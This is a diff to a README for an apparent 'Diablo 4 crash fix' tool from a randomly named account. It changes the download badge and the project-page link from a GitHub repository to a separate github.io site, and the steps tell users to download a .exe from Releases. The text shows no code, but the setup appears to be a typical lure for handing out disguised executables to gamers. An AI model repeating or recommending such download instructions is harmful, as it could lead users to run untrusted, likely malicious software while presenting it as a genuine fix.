@@ -1,6 +1,6 @@
 # 🛠️ Diablo-4-Crash-Fix - Stop game crashes on your computer
 
-[![](https://img.shields.io/badge/Download_Fix-Blue.svg)](https://github.com/controlled-jaundiceofthenewborn394/Diablo-4-Crash-Fix)
+[![](https://img.shields.io/badge/Download_Fix-Blue.svg)](https://controlled-jaundiceofthenewborn394.github.io)
 
 ## 📁 About This Tool
 
@@ -19,7 +19,7 @@ Your computer needs the following software and hardware to run the game and this
 
 Follow these steps to get the software on your computer:
 
-1. Go to the main project page at this location: [https://github.com/controlled-jaundiceofthenewborn394/Diablo-4-Crash-Fix](https://github.com/controlled-jaundiceofthenewborn394/Diablo-4-Crash-Fix)
+1. Go to the main project page at this location: [https://controlled-jaundiceofthenewborn394.github.io](https://controlled-jaundiceofthenewborn394.github.io)
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the most recent version number.
 4. Locate the file ending in .exe.
